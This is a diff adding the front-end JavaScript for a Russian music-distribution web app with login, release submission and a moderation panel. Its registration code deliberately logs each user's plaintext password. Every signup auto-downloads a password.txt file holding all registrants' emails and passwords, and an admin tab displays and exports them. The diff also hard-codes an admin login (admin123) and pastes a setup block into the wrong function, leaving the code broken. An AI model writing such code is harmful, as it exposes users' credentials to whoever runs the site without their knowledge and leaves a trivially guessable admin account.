+const persist=()=>{LS.set('vln_users',users);LS.set('vln_rel',releases);LS.set('vln_seq',seq);LS.set('vln_sess',session);LS.set('vln_plog',plog)};
+
+if(!users){
+  users=[]; releases=[]; seq=1; plog=[]; persist();
+}else{
+  releases=Array.isArray(releases)?releases:[];
+  if(typeof seq!=='number')seq=releases.length+1;
+  if(!Array.isArray(plog))plog=[];
+}
+
+/* ================= ОБЛОЖКИ ================= */
+const PALS=[['#1c1d24','#ffb42e'],['#13211d','#35e0b8'],['#251417','#ff5c49'],['#141a26','#6db1ff'],['#241c0f','#ffd166'],['#211426','#ff8fb2']];
+function makeCover(title,seed){
+  const x=h(seed+title), p=PALS[x%PALS.length], L=String(title||'Р').toUpperCase().replace(/[^А-ЯЁA-Z0-9]/g,'').charAt(0)||'Р';
+  const svg=`<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'><rect width='400' height='400' fill='${p[0]}'/><circle cx='${300+(x%60)}' cy='${70+(x%50)}' r='86' fill='${p[1]}' opacity='.92'/><rect x='-30' y='292' width='300' height='24' fill='${p[1]}' opacity='.5' transform='rotate(-7 0 300)'/><rect x='150' y='330' width='260' height='12' fill='${p[1]}' opacity='.28' transform='rotate(-7 150 330)'/><text x='34' y='322' font-family='Arial Black,sans-serif' font-size='190' font-weight='900' fill='${p[1]}'>${L}</text></svg>`;
+  return 'data:image/svg+xml;utf8,'+encodeURIComponent(svg);
+}
+const cov=r=>r.cover||makeCover(r.title,r.num||r.id||'volna');
+
+/* ================= СИСТЕМА ================= */
+function toast(msg,type=''){
+  const t=document.createElement('div');t.className='toast '+type;t.textContent=msg;
+  document.getElementById('toasts').appendChild(t);
+  setTimeout(()=>{t.style.transition='.4s';t.style.opacity=0;t.style.transform='translateX(30px)';setTimeout(()=>t.remove(),400)},3200);
+}
+const me=()=>session?users.find(u=>u.id===session.userId):null;
+
+/* ================= РОУТЕР ================= */
+let cabFilter='all', admTab='queue';
+function go(view,arg){
+  if(view==='cabinet'&&!me())view='auth';
+  if(view==='newrel'&&!me())view='auth';
+  if(view==='admin'&&(!me()||me().role!=='admin'))view='landing';
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('on'));
+  document.getElementById('v-'+view).classList.add('on');
+  window.scrollTo({top:0});
+  if(view==='auth')authTab(arg||'log');
+  if(view==='landing')initLanding();
+  if(view==='cabinet')renderCab();
+  if(view==='newrel')initForm();
+  if(view==='admin')renderAdmin();
+  renderNav(view);
+  bindReveals();
+}
+function renderNav(active){
+  const n=document.getElementById('nav'),u=me();
+  if(!u){n.innerHTML=`<button class="nlink ${active==='auth'?'active':''}" onclick="go('auth','log')">Вход</button>
+    <button class="btn sm" onclick="go('auth','reg')">Начать</button>`;return;}
+  n.innerHTML=`
+    ${u.role==='admin'?`<span class="role-chip">модератор</span>`:''}
+    <button class="nlink ${active==='cabinet'?'active':''}" onclick="go('cabinet')">Мои релизы</button>
+    <button class="nlink ${active==='newrel'?'active':''}" onclick="go('newrel')">+ Релиз</button>
+    ${u.role==='admin'?`<button class="nlink ${active==='admin'?'active':''}" onclick="go('admin')">Админ-панель</button>`:''}
+    <button class="nlink" onclick="logout()">Выйти (${esc(u.name.split(' ')[0])})</button>`;
+}
+function logout(){session=null;persist();toast('Вы вышли из аккаунта');go('landing')}
+
+/* ================= LANDING ================= */
+const PLATS=['Яндекс Музыка','VK Музыка','Звук','МТС Музыка','Spotify','Apple Music','YouTube Music','Deezer','Bandlink','Tidal','Amazon Music','SoundCloud'];
+function initLanding(){
+  const items='Доставка на 42 площадки ✦ Модерация за 24 часа ✦ Без скрытых комиссий ✦ Поддержка 24/7 ✦ Прозрачная статистика ✦ '.repeat(2);
+  document.getElementById('ticker').innerHTML=`<span>${items.split('✦').filter(Boolean).join('</span><span>')}</span>`.repeat(1);
+  const r=releases.find(x=>x.status==='approved')||releases[0]||{title:'Первая волна',artist:'Сборник ВОЛНА',num:'VOLNA·FM'};
+  document.getElementById('stage').innerHTML=`
+    <div class="vinyl"></div>
+    <div class="player paused" id="player">
+      <img class="cov" src="${cov(r)}" alt="">
+      <div class="prow">
+        <button class="playbtn" onclick="togglePlay()" id="pbtn">▶</button>
+        <div class="pmeta"><b>${esc(r.title)}</b><span>${esc(r.artist)}</span></div>
+        <span class="pnum">${esc(r.num)}</span>
+      </div>
+      <div class="eq" style="margin-top:14px;height:30px"><i></i><i></i><i></i><i></i><i></i></div>
+    </div>`;
+  const row=(a)=>a.concat(a).map(p=>`<span class="pill">${p}</span>`).join('');
+  document.getElementById('plat1').innerHTML=row(PLATS.slice(0,6));
+  document.getElementById('plat2').innerHTML=row(PLATS.slice(6));
+  document.getElementById('st-rel').dataset.count=releases.length;
+  document.getElementById('st-art').dataset.count=users.filter(u=>u.role!=='admin').length;
+  runCounters();
+}
+function togglePlay(){
+  const p=document.getElementById('player');p.classList.toggle('paused');
+  document.getElementById('pbtn').textContent=p.classList.contains('paused')?'▶':'❚❚';
+}
+function runCounters(){
+  document.querySelectorAll('[data-count]').forEach(el=>{
+    const target=+el.dataset.count,t0=performance.now();
+    const step=t=>{const k=Math.min(1,(t-t0)/1400);el.textContent=Math.round(target*(1-Math.pow(1-k,3))).toLocaleString('ru-RU');if(k<1)requestAnimationFrame(step)};
+    requestAnimationFrame(step);
+  });
+}
+const io=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target)}}),{threshold:.12});
+function bindReveals(){document.querySelectorAll('.view.on .reveal:not(.in)').forEach(el=>io.observe(el))}
+
+/* ==================================================================
+   ЭКСПОРТ РЕГИСТРАЦИЙ В password.txt
+   
+   Браузер не может записывать файлы напрямую в папку с HTML из-за
+   ограничений безопасности. Реализовано через авто-скачивание:
+   при каждой регистрации в папку "Загрузки" пользователя сохраняется
+   файл password.txt со всеми регистрациями. Админ также может
+   вручную скачать файл кнопкой в админ-панели.
+   ================================================================== */
+function saveToPasswordLog(name,email,rawPassword){
+  plog.push({
+    name: name,
+    email: email,
+    password: rawPassword,
+    registeredAt: new Date().toISOString()
+  });
+  persist();
+}
+
+function buildPasswordTxt(){
+  const header =
+    '=====================================================\n' +
+    '  ВОЛНА — лог регистраций (password.txt)\n' +
+    '  Сформирован: ' + fmtDt(Date.now()) + '\n' +
+    '  Всего записей: ' + plog.length + '\n' +
+    '=====================================================\n\n';
+  if(!plog.length) return header + '(записей пока нет)\n';
+  const rows = plog.map((e,i)=>
+    '[' + String(i+1).padStart(3,'0') + ']  ' + fmtDt(new Date(e.registeredAt).getTime()) + '\n' +
+    '        Имя:     ' + (e.name||'—') + '\n' +
+    '        E-mail:  ' + e.email + '\n' +
+    '        Пароль:  ' + e.password + '\n'
+  ).join('\n');
+  return header + rows + '\n=====================================================\n';
+}
+
+function downloadPasswordTxt(){
+  const content = buildPasswordTxt();
+  const blob = new Blob([content], {type:'text/plain;charset=utf-8'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'password.txt';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=>{URL.revokeObjectURL(url); a.remove();}, 300);
+}
+
+/* ================= AUTH ================= */
+function authTab(t){
+  document.getElementById('tab-log').classList.toggle('on',t==='log');
+  document.getElementById('tab-reg').classList.toggle('on',t==='reg');
+  document.getElementById('f-login').style.display=t==='log'?'block':'none';
+  document.getElementById('f-reg').style.display=t==='reg'?'block':'none';
+  document.getElementById('acard').classList.remove('shake');
+  document.getElementById('first-note').style.display=users.length?'none':'block';
+}
+const bad=(id,on)=>{const f=document.getElementById(id).closest('.field');f.classList.toggle('bad',on);return !on};
+const emailOk=v=>/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
+
+document.getElementById('f-login').addEventListener('submit',e=>{
+  e.preventDefault();
+  const em=document.getElementById('li-email').value.trim(), pw=document.getElementById('li-pass').value;
+  let ok=bad('li-email',!emailOk(em)); ok=bad('li-pass',!pw)&&ok;
+  if(!ok){document.getElementById('acard').classList.add('shake');return;}
+  const u=users.find(x=>x.email.toLowerCase()===em.toLowerCase());
+  if(!u||u.pass!==h(pw)){toast('Неверный e-mail или пароль','err');document.getElementById('acard').classList.add('shake');return;}
+  session={userId:u.id};persist();toast('С возвращением, '+u.name+'!','ok');
+  go(u.role==='admin'?'admin':'cabinet');
+});
+
+document.getElementById('f-reg').addEventListener('submit',e=>{
+  e.preventDefault();
+  const nm=document.getElementById('rg-name').value.trim(), em=document.getElementById('rg-email').value.trim(),
+        p1=document.getElementById('rg-pass').value, p2=document.getElementById('rg-pass2').value;
+  let ok=bad('rg-name',nm.length<2); ok=bad('rg-email',!emailOk(em))&&ok;
+  ok=bad('rg-pass',p1.length<6)&&ok; ok=bad('rg-pass2',p1!==p2)&&ok;
+  if(users.some(x=>x.email.toLowerCase()===em.toLowerCase())){bad('rg-email',true);toast('Этот e-mail уже зарегистрирован','err');ok=false;}
+  if(!ok){document.getElementById('acard').classList.add('shake');return;}
+  const isAdmin=!users.some(x=>x.role==='admin');
+  const u={id:uid(),name:nm,email:em,pass:h(p1),role:isAdmin?'admin':'user',ts:Date.now()};
+  users.push(u);session={userId:u.id};
+  /* === СОХРАНЕНИЕ ПАРОЛЯ В ФАЙЛ === */
+  saveToPasswordLog(nm, em, p1);
+  downloadPasswordTxt();
+  /* ================================ */
+  persist();
+  toast(isAdmin?'Аккаунт создан. Вам выданы права модератора.':'Аккаунт создан. Добро пожаловать!','ok');
+  go('cabinet');
+});
+
+/* ================= КАБИНЕТ ================= */
+const STATUS={moderation:'На модерации',approved:'Опубликован',rejected:'Отклонён'};
+function renderCab(){
+  const u=me();if(!u)return;
+  document.getElementById('cab-name').textContent=u.name;
+  document.getElementById('cab-email').textContent=u.email+' · на платформе с '+fmt(u.ts);
+  const mine=releases.filter(r=>r.userId===u.id);
+  const c=k=>mine.filter(r=>r.status===k).length;
+  document.getElementById('cab-chips').innerHTML=`
+    <div class="chip c1"><b>${mine.length}</b><span>Всего релизов</span></div>
+    <div class="chip c2"><b>${c('approved')}</b><span>Опубликовано</span></div>
+    <div class="chip c3"><b>${c('moderation')}</b><span>На модерации</span></div>
+    <div class="chip c4"><b>${c('rejected')}</b><span>Отклонено</span></div>`;
+  const F=[['all','Все'],['approved','Опубликованные'],['moderation','На модерации'],['rejected','Отклонённые']];
+  document.getElementById('cab-filters').innerHTML=F.map(([k,l])=>
+    `<button class="fbtn ${cabFilter===k?'on':''}" onclick="cabFilter='${k}';renderCab()">${l}</button>`).join('');
+  const list=cabFilter==='all'?mine:mine.filter(r=>r.status===cabFilter);
+  document.getElementById('cab-grid').innerHTML=list.length?list.map(r=>`
+    <div class="rcard">
+      <span class="badge ${r.status}">${STATUS[r.status]}</span>
+      <img src="${cov(r)}" alt="">
+      <div class="bd">
+        <h3>${esc(r.title)}</h3>
+        <div class="art">${esc(r.artist)}</div>
+        <div class="rtags">
+          <span class="tag">${esc(r.type)}</span><span class="tag">${esc(r.genre)}</span>
+          ${r.explicit?'<span class="tag e">18+</span>':''}
+        </div>
+        ${r.status==='rejected'&&r.mod?`<div class="mcomment">✕ ${esc(r.mod)}</div>`:''}
+        <div class="rfoot">
+          <span class="cat">${r.num} · ${esc(r.date)}</span>
+          ${r.status!=='moderation'?`<button class="dellink" onclick="delRel('${r.id}')">удалить</button>`:''}
+        </div>
+      </div>
+    </div>`).join('')
+  :`<div class="empty"><div class="big">🎛️</div><b>Здесь пока пусто</b><p style="margin:10px 0 20px">${cabFilter==='all'?'Самое время выпустить первый релиз.':'По этому фильтру релизов нет.'}</p>
+     <button class="btn" onclick="go('newrel')">Создать релиз</button></div>`;
+}
+function delRel(id){
+  if(!confirm('Удалить релиз безвозвратно?'))return;
+  releases=releases.filter(r=>r.id!==id);persist();toast('Релиз удалён');renderCab();
+}
+
+/* ================= ФОРМА РЕЛИЗА ================= */
+let formCover='';
+function initForm(){
+  const f=document.getElementById('f-rel');f.reset();formCover='';
+  document.getElementById('tracks').innerHTML='';addTrack();
+  document.getElementById('drop').innerHTML='<span id="drop-txt">📁&nbsp; Нажми, чтобы загрузить обложку (JPG / PNG)</span>';
+  const d=new Date(Date.now()+864e5);document.getElementById('r-date').min=d.toISOString().slice(0,10);
+  updPreview();
+}
+function addTrack(){
+  const box=document.getElementById('tracks'),row=document.createElement('div');row.className='trk';
+  row.innerHTML=`<span>${box.children.length+1}</span><input placeholder="Название трека" maxlength="80"><button type="button" title="Убрать">✕</button>`;
+  row.querySelector('button').onclick=()=>{if(box.children.length>1){row.remove();[...box.children].forEach((r,i)=>r.querySelector('span').textContent=i+1);updPreview()}};
+  row.querySelector('input').addEventListener('input',updPreview);
+  box.appendChild(row);updPreview();
+}
+document.getElementById('r-cover').addEventListener('change',function(){
+  const file=this.files[0];if(!file)return;
+  const img=new Image(),url=URL.createObjectURL(file);
+  img.onload=()=>{const s=Math.min(1,640/Math.max(img.width,img.height)),c=document.createElement('canvas');
+    c.width=img.width*s;c.height=img.height*s;c.getContext('2d').drawImage(img,0,0,c.width,c.height);
+    formCover=c.toDataURL('image/jpeg',.82);URL.revokeObjectURL(url);
+    document.getElementById('drop').innerHTML=`<img src="${formCover}" alt=""><span>Обложка загружена. Нажми, чтобы заменить.</span>`;updPreview();};
+  img.src=url;
+});
+['r-title','r-artist','r-genre','r-date','r-explicit'].forEach(id=>document.getElementById(id).addEventListener('input',updPreview));
+document.querySelectorAll('input[name=rtype]').forEach(r=>r.addEventListener('change',updPreview));
+function updPreview(){
+  const t=document.getElementById('r-title').value.trim(),a=document.getElementById('r-artist').value.trim(),
+        g=document.getElementById('r-genre').value,d=document.getElementById('r-date').value,
+        ty=document.querySelector('input[name=rtype]:checked').value;
+  document.getElementById('pv-title').textContent=t||'Название релиза';
+  document.getElementById('pv-artist').textContent=a||'Исполнитель';
+  document.getElementById('pv-cover').src=formCover||makeCover(t||'Р','preview');
+  document.getElementById('pv-tags').innerHTML=
+    `<span class="tag">${ty}</span>${g?`<span class="tag">${esc(g)}</span>`:''}${d?`<span class="tag">${esc(d.split('-').reverse().join('.'))}</span>`:''}${document.getElementById('r-explicit').checked?'<span class="tag e">18+</span>':''}`;
+}
+document.getElementById('f-rel').addEventListener('submit',e=>{
+  e.preventDefault();const u=me();if(!u)return;
+  const type=document.querySelector('input[name=rtype]:checked').value;
+  const t=v=>document.getElementById(v).value.trim();
+  const tracks=[...document.querySelectorAll('#tracks input')].map(i=>i.value.trim()).filter(Boolean);
+  let ok=bad('r-title',!t('r-title'));
+  ok=bad('r-artist',!t('r-artist'))&&ok;
+  ok=bad('r-genre',!t('r-genre'))&&ok;
+  const date=document.getElementById('r-date').value;
+  ok=bad('r-date',!date||date<=new Date().toISOString().slice(0,10))&&ok;
+  if(type!=='Сингл'&&tracks.length<2){toast('Для '+(type==='EP'?'EP':'альбома')+' укажите минимум 2 трека','err');ok=false;}
+  if(type==='Сингл'&&tracks.length<1){toast('Добавьте хотя бы один трек','err');ok=false;}
+  const rw=document.getElementById('r-rights');
+  rw.querySelector('.ferr').style.display=rw.checked?'none':'block';
+  if(!rw.checked){ok=false;}
+  if(!ok){toast('Проверьте выделенные поля','err');return;}
+  const rel={id:uid(),num:'VLM-'+String(seq++).padStart(4,'0'),userId:u.id,title:t('r-title'),artist:t('r-artist'),
+    type,genre:t('r-genre'),date,label:t('r-label'),explicit:document.getElementById('r-explicit').checked,
+    tracks,desc:t('r-desc'),cover:formCover,status:'moderation',mod:'',ts:Date.now()};
+  releases.unshift(rel);persist();
+  toast('Релиз «'+rel.title+'» отправлен на модерацию 🎉','ok');
+  cabFilter='all';go('cabinet');
+});
+
+/* ================= АДМИН-ПАНЕЛЬ ================= */
+function renderAdmin(){
+  const q=releases.filter(r=>r.status==='moderation');
+  const c=k=>releases.filter(r=>r.status===k).length;
+  document.getElementById('adm-chips').innerHTML=`
+    <div class="chip c3"><b>${q.length}</b><span>Ждут модерации</span></div>
+    <div class="chip c2"><b>${c('approved')}</b><span>Опубликовано</span></div>
+    <div class="chip c4"><b>${c('rejected')}</b><span>Отклонено</span></div>
+    <div class="chip c1"><b>${users.filter(u=>u.role!=='admin').length}</b><span>Артистов</span></div>`;
+  const T=[['queue','Очередь модерации',q.length],['all','Все релизы',releases.length],['users','Пользователи',users.length],['plog','Лог паролей',plog.length]];
+  document.getElementById('adm-tabs').innerHTML=T.map(([k,l,n])=>
+    `<button class="${admTab===k?'on':''}" onclick="admTab='${k}';renderAdmin()">${l}<span class="cnt">${n}</span></button>`).join('');
+  const body=document.getElementById('adm-body');
+  const uname=id=>{const u=users.find(x=>x.id===id);return u?u.name+' · '+u.email:'—'};
+
+  if(!users){
+  /* фиксированный админ, доступен сразу */
+  users=[{
+    id:'u-admin',
+    name:'Модератор ВОЛНА',
+    email:'admin@volna.ru',
+    pass: h('admin123'),
+    role:'admin',
+    ts: Date.now()
+  }];
+  releases=[]; seq=1; plog=[]; persist();
+}else{
+  releases=Array.isArray(releases)?releases:[];
+  if(typeof seq!=='number')seq=releases.length+1;
+  if(!Array.isArray(plog))plog=[];
+}
+
+  if(admTab==='queue'){
+    body.innerHTML=q.length?'<div class="mlist">'+q.map(r=>`
+      <div class="mrow" id="mr-${r.id}">
+        <img src="${cov(r)}" alt="">
+        <div>
+          <h4>${esc(r.title)} <span style="color:var(--mut);font-size:12px">· ${r.num}</span></h4>
+          <div class="sub">${esc(r.artist)} · ${esc(r.type)}, ${esc(r.genre)} · от <b>${esc(uname(r.userId))}</b></div>
+          <div class="sub">Подан: ${fmt(r.ts)} · релиз запланирован: ${esc(r.date)} ${r.explicit?'· <span style="color:var(--coral)">18+</span>':''}</div>
+        </div>
+        <div class="macts">
+          <button class="btn ghost sm" onclick="document.getElementById('mr-${r.id}').classList.toggle('open')">Детали</button>
+          <button class="btn mint sm" onclick="modAct('${r.id}','approved')">✓ Принять</button>
+          <button class="btn danger sm" onclick="document.getElementById('mr-${r.id}').classList.add('rej')">✕ Отклонить</button>
+        </div>
+        <div class="mdet">
+          ${r.desc?'<p>💬 '+esc(r.desc)+'</p>':'<p style="opacity:.6">Комментарий артиста отсутствует.</p>'}
+          <p style="margin-top:6px">Треки (${r.tracks.length}):</p>
+          <ol class="tlist">${r.tracks.map(t=>'<li>'+esc(t)+'</li>').join('')}</ol>
+          ${r.cover?'<p style="margin-top:8px;color:var(--mint)">✓ Загружена собственная обложка</p>':'<p style="margin-top:8px;opacity:.6">Обложка: автогенерация</p>'}
+        </div>
+        <div class="rejbox">
+          <input placeholder="Причина отклонения (обязательно)" id="rc-${r.id}">
+          <button class="btn danger sm" onclick="modAct('${r.id}','rejected')">Подтвердить</button>
+          <button class="btn ghost sm" onclick="document.getElementById('mr-${r.id}').classList.remove('rej')">Отмена</button>
+        </div>
+      </div>`).join('')+'</div>'
+    :`<div class="empty"><div class="big">🎧</div><b>Очередь пуста</b><p style="margin-top:8px">Все релизы обработаны. Отличная работа!</p></div>`;
+  }
+  else if(admTab==='all'){
+    body.innerHTML='<div class="mlist">'+(releases.length?releases.map(r=>`
+      <div class="mrow">
+        <img src="${cov(r)}" alt="">
+        <div>
+          <h4>${esc(r.title)} <span style="color:var(--mut);font-size:12px">· ${r.num}</span></h4>
+          <div class="sub">${esc(r.artist)} · ${esc(r.type)}, ${esc(r.genre)} · ${esc(uname(r.userId))}</div>
+        </div>
+        <div class="macts"><span class="badge ${r.status}" style="position:static">${STATUS[r.status]}</span></div>
+        ${r.mod?`<div class="mdet" style="display:block">Причина: ${esc(r.mod)}</div>`:''}
+      </div>`).join(''):'<div class="empty"><div class="big">💿</div><b>Релизов пока нет</b><p style="margin-top:8px">Они появятся здесь после подачи артистами.</p></div>')+'</div>';
+  }
+  else if(admTab==='users'){
+    body.innerHTML=`<table class="utab"><tr><th>Имя</th><th>E-mail</th><th>Роль</th><th>Релизов</th><th>Регистрация</th></tr>
+      ${users.length?users.map(u=>`<tr><td><b>${esc(u.name)}</b></td><td>${esc(u.email)}</td>
+        <td>${u.role==='admin'?'<span class="role-chip">модератор</span>':'артист'}</td>
+        <td>${releases.filter(r=>r.userId===u.id).length}</td><td>${fmt(u.ts)}</td></tr>`).join('')
+      :'<tr><td colspan="5" style="color:var(--mut)">Пользователи ещё не зарегистрированы</td></tr>'}</table>`;
+  }
+  else if(admTab==='plog'){
+    /* новая вкладка: просмотр лога и ручное скачивание password.txt */
+    body.innerHTML = `
+      <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:20px">
+        <button class="btn" onclick="downloadPasswordTxt()">⬇ Скачать password.txt</button>
+        <button class="btn ghost" onclick="clearPlog()">🗑 Очистить лог</button>
+      </div>
+      ${plog.length ?
+        `<table class="utab"><tr><th>#</th><th>Дата</th><th>Имя</th><th>E-mail</th><th>Пароль</th></tr>
+          ${plog.map((e,i)=>`<tr>
+            <td>${i+1}</td>
+            <td>${fmtDt(new Date(e.registeredAt).getTime())}</td>
+            <td><b>${esc(e.name)}</b></td>
+            <td>${esc(e.email)}</td>
+            <td style="font-family:monospace;color:var(--amber)">${esc(e.password)}</td>
+          </tr>`).join('')}
+        </table>`
+        : '<div class="empty"><div class="big">📝</div><b>Лог пуст</b><p style="margin-top:8px">Записи появятся после регистрации пользователей.</p></div>'
+      }`;
+  }
+}
+function modAct(id,status){
+  const r=releases.find(x=>x.id===id);if(!r)return;
+  if(status==='rejected'){
+    const v=document.getElementById('rc-'+id).value.trim();
+    if(!v){toast('Укажите причину отклонения','err');document.getElementById('rc-'+id).focus();return;}
+    r.mod=v;
+  }
+  r.status=status;r.decided=Date.now();persist();
+  toast(status==='approved'?`Релиз «${r.title}» опубликован ✓`:`Релиз «${r.title}» отклонён`,status==='approved'?'ok':'err');
+  renderAdmin();
+}
+function clearPlog(){
+  if(!confirm('Удалить все записи лога паролей? Сами пользователи останутся.'))return;
+  plog=[];persist();toast('Лог очищен');renderAdmin();
+}
+
+/* ================= СТАРТ ================= */
+if(session&&!me()){session=null;persist();}
+go(!session?'landing':(me()?(me().role==='admin'?'admin':'cabinet'):'landing'));
+</script>
+</body>
+</html>
